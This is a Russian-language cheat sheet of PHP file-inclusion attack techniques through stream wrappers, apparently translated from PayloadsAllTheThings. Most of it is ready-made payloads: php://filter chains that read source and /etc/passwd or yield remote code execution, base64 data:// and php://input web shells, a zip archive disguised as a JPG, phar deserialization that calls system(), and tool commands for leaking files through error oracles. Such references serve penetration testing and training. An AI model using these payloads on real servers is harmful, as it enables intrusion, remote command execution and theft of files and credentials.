* [Wrapper php://filter]()
* [Wrapper data://]()
* [Wrapper expect://]()
* [Wrapper input://]()
* [Wrapper zip://]()
* [Wrapper phar://](#Wrapper-phar)
   * [Структура PHAR архива]()
   * [Десериализация PHAR]()
* [Wrapper convert.iconv:// и dechunk://]()
   * [Утечка содержимого файла через оракул на основе ошибок]()
   * [Утечка содержимого файла внутри пользовательского формата вывода]()
   * Ссылки

> Wrapper в контексте уязвимостей включения файлов относится к протоколу или методу, используемому для доступа или включения файла.
>> Wrappers часто используются в PHP или других серверных языках для расширения функциональности включения файлов, позволяя использовать протоколы, такие как HTTP, FTP и другие, в дополнение к локальной файловой системе.

# Wrapper php://filter

Часть "php://filter" нечувствительна к регистру.

|Фильтр|Описание|
|--------|----------|
|php://filter/read=string.rot13/resource=index.php	|Отображает index.php в кодировке rot13|
|php://filter/convert.iconv.utf-8.utf-16/resource=index.php |	Кодирует index.php из utf8 в utf16|
|php://filter/convert.base64-encode/resource=index.php|Отображает index.php в виде строки в кодировке base64|

```python
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Wrappers можно объединять в цепочку с wrapper'ом сжатия для больших файлов.

```python
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

ПРИМЕЧАНИЕ: Wrappers можно объединять несколько раз с помощью | или /:

* Множественное декодирование base64: ```php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s```
* deflate, затем base64encode (полезно для эксфильтрации с ограниченным набором символов): ```php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php```

```python
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```
Также существует способ превратить ```php://filter``` в полноценный RCE.

* [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - CLI для генерации цепочек PHP фильтров
  
```python
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```
* [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) - для генерации пользовательского полезная нагрузка.

```php
# уязвимый файл: index.php
# уязвимый параметр: file
# выполняемая команда: id
# выполняемый PHP код: <?=`$_GET[0]`;;?>
curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
```

# Wrapper data://

Полезная нагрузка в кодировке base64: "<?php system($_GET['cmd']);echo 'Shell done !'; ?>".

```python
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

Забавный факт: можно вызвать XSS и обойти Chrome Auditor с помощью: http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+

# Wrapper expect://

При использовании в PHP или подобном приложении, может позволить злоумышленнику выполнять команды в системной оболочке, так как wrapper expect:// может вызывать команды оболочки как часть своего ввода.

```python
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

# Wrapper input://

Укажите вашу полезную нагрузку в параметрах POST, это можно сделать с помощью простой команды curl.

```bash
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

В качестве альтернативы, Kadimus имеет модуль для автоматизации этой атаки.

```bash
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

# Wrapper zip://

* Создайте вредоносную полезную нагрузку: echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;

* Заархивируйте файл:

```bash
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php
```

* Загрузите архив и получите доступ к файлу с помощью wrapper'ов:

```bash
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

# Wrapper phar://

## Структура PHAR архива

Файлы PHAR работают как ZIP-файлы, и вы можете использовать phar:// для доступа к файлам, хранящимся внутри них.

* Создайте phar-архив, содержащий файл-бэкдор: php --define phar.readonly=0 archive.php

```php
<?php
  $phar = new Phar('archive.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering();
?>
```
* Используйте wrapper phar://: curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt

## Десериализация PHAR

⚠️ Эта техника не работает на PHP 8+, десериализация была удалена.

Если операция с файлом выполняется на нашем существующем phar-файле через wrapper phar://, то его сериализованные метаданные десериализуются. Эта уязвимость возникает в следующих функциях, включая file_exists: include, file_get_contents, file_put_contents, copy, file_exists, is_executable, is_file, is_dir, is_link, is_writable, fileperms, fileinode, filesize, fileowner, filegroup, fileatime, filemtime, filectime, filetype, getimagesize, exif_read_data, stat, lstat, touch, md5_file, и т.д.

Для этого эксплойта требуется хотя бы один класс с магическими методами, такими как __destruct() или __wakeup(). Возьмем в качестве примера этот класс AnyClass, который выполняет параметр data.
php

class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_GET['page']);

Мы можем создать phar-архив, содержащий сериализованный объект в своих метаданных.
php

// создаем новый Phar
$phar = new Phar('deser.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// добавляем объект любого класса в качестве метаданных
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();

Наконец, вызовите wrapper phar: curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar

ПРИМЕЧАНИЕ: вы можете использовать $phar->setStub(), чтобы добавить магические байты JPG файла: \xff\xd8\xff
php

$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

# Wrapper convert.iconv:// и dechunk://

Утечка содержимого файла через оракул на основе ошибок

    convert.iconv://: преобразует ввод в другую кодировку (convert.iconv.utf-16le.utf-8)

    dechunk://: если строка не содержит символов новой строки, она полностью очистит строку, если и только если строка начинается с A-Fa-f0-9

Цель этой эксплуатации - утечка содержимого файла по одному символу за раз, на основе writeup от DownUnderCTF.

Требования:

    Бэкенд не должен использовать file_exists или is_file.

    Уязвимый параметр должен быть в POST-запросе.

        Вы не можете утечь более 135 символов в GET-запросе из-за ограничения по размеру.

Цепочка эксплойта основана на PHP фильтрах: iconv и dechunk:

    Используйте фильтр iconv с кодировкой, экспоненциально увеличивающей размер данных, чтобы вызвать ошибку памяти.

    Используйте фильтр dechunk, чтобы определить первый символ файла, на основе предыдущей ошибки.

    Снова используйте фильтр iconv с кодировками, имеющими разный порядок байтов, чтобы поменять местами оставшиеся символы с первым.

Эксплойт с использованием synacktiv/php_filter_chains_oracle_exploit, скрипт будет использовать либо код состояния HTTP: 500, либо время в качестве оракула на основе ошибок для определения символа.

```bash
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!
```

## Утечка содержимого файла внутри пользовательского формата вывода

    ambionics/wrapwrap - Генерирует цепочку php://filter, которая добавляет префикс и суффикс к содержимому файла.

Чтобы получить содержимое некоторого файла, мы хотели бы иметь: {"message":"<содержимое файла>"}.

```bash
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

Это можно использовать против уязвимого кода, подобного следующему.

```php
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>
```

## Утечка содержимого файла с использованием примитива слепого чтения файлов

    ambionics/lightyear

bash

code remote.py # отредактируйте Remote.oracle
./lightyear.py test # проверьте, что ваша реализация работает
./lightyear.py /etc/passwd # сдампите файл!


